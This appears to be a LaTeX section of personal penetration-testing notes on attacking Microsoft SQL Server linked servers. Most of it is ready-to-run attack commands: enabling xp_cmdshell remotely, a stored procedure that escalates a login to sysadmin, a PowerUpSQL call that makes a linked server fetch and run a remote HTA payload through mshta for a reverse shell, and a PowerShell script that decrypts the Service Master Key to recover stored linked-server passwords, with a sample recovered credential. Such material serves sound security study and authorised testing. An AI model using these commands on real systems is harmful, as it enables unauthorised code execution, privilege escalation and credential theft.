\section{Communicate with Other Databases}
\label{mssql:link}

\subsection{Introduction}

There are \href{https://learn.microsoft.com/en-us/sql/relational-databases/linked-servers/linked-servers-openquery-openrowset-exec-at?view=sql-server-ver16}{three ways} to remotely execute queries on linked servers:
\begin{itemize}
    \item \href{https://learn.microsoft.com/en-us/sql/t-sql/functions/openquery-transact-sql?view=sql-server-ver16}{OPENQUERY}: Executes a query on a pre-defined linked server. 
    \item \href{https://learn.microsoft.com/en-us/sql/t-sql/language-elements/execute-transact-sql?view=sql-server-ver16}{EXECUTE AT}: Executes a query on a pre-defined linked server.
    \item \href{https://learn.microsoft.com/en-us/sql/t-sql/functions/openrowset-transact-sql?view=sql-server-ver16}{OPENROWSET}: Connects and executes a query on a remote server. Is meant to be a more ad-hoc method of accessing remote servers, since it requires a connection string to be passed as an argument.
\end{itemize}


\verb+mssqlclient.py+
\begin{verbatim}
use_link <srv_name>
enable_xp_cmdshell
xp_cmdshell whoami
use_link localhost # to come back
\end{verbatim}

\subsection{Identify Remote privileges}

\begin{verbatim}
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [<srv_name>]

select * from openquery("<srv_name>",'select IS_SRVROLEMEMBER(''sysadmin'')')

\end{verbatim}

If we need to use quotes in our query to the linked server, we need to use single double quotes to escape the single quote. To run multiples commands at once we can divide them up with a semi colon.


Note:
\begin{verbatim}
select * from openquery("<srv_name>", 'select  srvname, isremote from master.sys.sysservers')
\end{verbatim}


\subsection{Commands execution}

\subsubsection{mssql}

\begin{verbatim}
EXECUTE ('EXEC sp_configure "show advanced options", 1; RECONFIGURE; EXEC sp_configure "xp_cmdshell", 1; RECONFIGURE; EXEC xp_cmdshell "whoami";') AT [<srv_name>]

EXECUTE ('EXEC sp_configure "show advanced options", 1; RECONFIGURE;') AT [<srv_name>]

EXECUTE('EXEC sp_configure "xp_cmdshell", 1; RECONFIGURE;') AT [<srv_name>]

EXECUTE('xp_cmdshell "whoami"') AT [<srv_name>]
\end{verbatim}

\subsubsection{mssqlclient.py}
\begin{verbatim}
use_link <srv_name>
enable_xp_cmdshell
xp_cmdshell whoami
\end{verbatim}



\subsection{RevShell on linked server}

with clear text creds of sa on linked server and powerupsql

\begin{verbatim}
Get-SQLServerLinkCrawl -Username sa -Password Password@1 -Instance WIN-P83OS778EQK\SQLEXPRESS -Query "exec master..xp_cmdshell 'mshta.exe http://192.168.1.2:8080/ugfFOJBvO.hta'"
\end{verbatim}


\begin{verbatim}
EXECUTE AS LOGIN = 'sa'
EXECUTE('sp_configure ''show advanced options'',1;reconfigure;') AT  "ZSM-SVRCSQL02"
EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;')  AT "ZSM-SVRCSQL02"
\end{verbatim}

\subsection{Trustworthy databases}

\begin{verbatim}
select is_rpc_out_enabled from sys.servers where name='SQL02\SQLEXPRESS'

EXEC ('CREATE PROCEDURE sp_escalate WITH EXECUTE AS OWNER 
        AS EXEC sp_addsrvrolemember ''htb-dbuser'',''sysadmin''') 
        AT [<srv_name>]

EXEC ('sp_escalate;
        SELECT IS_SRVROLEMEMBER(''sysadmin'');
        SELECT SUSER_NAME()') 
        AT [<srv_name>]

EXECUTE('sp_configure ''xp_cmdshell'',1;
        reconfigure;') 
        AT [<srv_name>]

EXECUTE('xp_cmdshell "whoami"') AT [<srv_name>]
\end{verbatim}


\verb+mssqlclient.py+:
\begin{verbatim}
use_link <srv_name>
USE "htb-reports"
SELECT is_srvrolemember('sysadmin')
exec master.dbo.sp_configure "show advanced options",1;RECONFIGURE;exec master.dbo.sp_configure "xp_cmdshell", 1;RECONFIGURE;
\end{verbatim}


\subsection{Extracting passwords from SQL Server Linked Servers}

After compromising a machine which hosts an MSSQL Server instance with linked servers, it is possible to extract and decrypt the (MSSQL Server Authentication) credentials used to authenticate to said linked servers. Requierement:
\begin{itemize}
    \item control of a login with the sysadmin role
    \item and
    \item an account with local administrator privileges on the underlying server.
\end{itemize}  

See~\href{https://www.netspi.com/blog/entryid/133/sql-server-local-authorization-bypass/}{SQL Server Local Authorization Bypass} in case of only local Admin access is available.



\subsubsection{Manual}
The credentials used to authenticate against linked servers are stored inside the \href{https://learn.microsoft.com/en-us/sql/relational-databases/system-tables/system-base-tables?view=sql-server-ver16}{master.sys.syslnklgns} table. Specifically, the encrypted password is stored in the “pwdhash” column (even though it’s not a hash). In order to access this table, a \href{https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/diagnostic-connection-for-database-administrators?view=sql-server-ver16}{dedicated administrator connection (DAC)} must be used. By default, DACs may only be created locally (controlled by the \href{https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/remote-admin-connections-server-configuration-option?view=sql-server-ver16}{remote admin connections} configuration option).



\begin{verbatim}
SELECT sysservers.srvname, syslnklgns.name, syslnklgns.pwdhash
    FROM master.sys.syslnklgns
    INNER JOIN master.sys.sysservers ON syslnklgns.srvid = sysservers.srvid 
    WHERE LEN(pwdhash) > 0;
\end{verbatim}

The credentials stored in sys.syslnklgns are symmetrically encrypted with the \href{https://learn.microsoft.com/en-us/sql/relational-databases/security/encryption/sql-server-and-database-encryption-keys-database-engine?view=sql-server-ver16&redirectedfrom=MSDN}{Service Master Key}, which is stored inside the \href{https://learn.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-key-encryptions-transact-sql?view=sql-server-ver16}{sys.key\_encryptions} table with a \verb+key_id+ value of \verb+102+.

\begin{verbatim}
SELECT * FROM sys.key_encryptions;
\end{verbatim}


The \href{https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.protecteddata.unprotect?view=net-8.0}{[System.Security.DataProtection]::Unprotect} function in PowerShell can bu used to decrypt the Service Master Key, but before  the \verb+entropy bytes+ which MSSQL Server used when protecting the data will be necessary. 

This can be retrieved  from the registry, where they are stored in the following key (where \verb+MSSQL16.MSSQLSERVER+ is the name of the MSSQL Server instance):
\begin{verbatim}
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\MSSQL16.MSSQLSERVER\Security" -Name "Entropy"
\end{verbatim}

Putting it all together, we can decrypt the Service Master Key with the following PowerShell script, where \verb+$encryptedData+ is set to the value returned from our previous query.

\begin{verbatim}
$encryptedData = "0xFFFFFFFF500100...SNIP..."; # encrypted Master key
$encryptedData = $encryptedData.Substring(18); # Remove 0x and padding
$encryptedData = [byte[]] -split ($encryptedData -replace '..', '0x$& ');

$entropy = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\MSSQL16.MSSQLSERVER\Security" -Name "Entropy").Entropy;

Add-Type -AssemblyName System.Security;
$SMK = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedData, $entropy, 'LocalMachine');
Write-Host (($SMK|ForEach-Object ToString X2) -join '');    
\end{verbatim}


Since MSSQL Server 2012, the Service Master Key is used with AES for encryption and 3DES was used before.

The algorithm used can be verified by checking the length of the decrypted Service Master Key. If it is 16 bytes long, then AES was used, and if it is 8 bytes long then 3DES was used.

In order to decrypt something with AES, we need to know three values:
\begin{itemize}
    \item The \verb+Key+, which in this case is the Service Master Key
    \item The \verb+IV+, which in this case is the first 16 bytes (after padding) of pwdhash
    \item The \verb+Ciphertext+, which in this case is the remaining bytes from pwdhash
\end{itemize}

\begin{verbatim}
SELECT
	name,
	SUBSTRING(pwdhash, 5, 16) AS 'IV',
	SUBSTRING(pwdhash, 21, LEN(pwdhash) - 20) AS 'Ciphertext'
FROM sys.syslnklgns
WHERE LEN(pwdhash) > 0;
\end{verbatim}

then use \href{https://gchq.github.io/CyberChef/#recipe=AES_Decrypt(%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D,'CBC','Hex','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)Decode_text('UTF-16LE%20(1200)')}{cyberchef AES Decrypt}


\subsubsection{Automated}
tool \href{https://github.com/IamLeandrooooo/SQLServerLinkedServersPasswords/}{DecryptLinkedServersPasswords.ps1}

can be launched by \verb+Administrator+ or inside db with \verb+sa+:
\begin{verbatim}
exec xp_cmdshell 'powershell -exec bypass c:\temp\DecryptLinkedServersPasswords.ps1'

MSSQLSERVER ZSM-SVRCSQL02 sa       VeryUncrackablePassword2022!
\end{verbatim}


links:
\begin{itemize}
    \item \href{https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#extracting-passwords-from-sql-server-linked-servers}{hacktricks}
    \item \href{https://www.netspi.com/blog/technical/adversary-simulation/decrypting-mssql-credential-passwords/}{Decrypting MSSQL Credential Passwords}
    \item \href{https://www.hackingarticles.in/mssql-for-pentester-abusing-linked-database/}{MSSQL for Pentester: Abusing Linked Database}
\end{itemize}
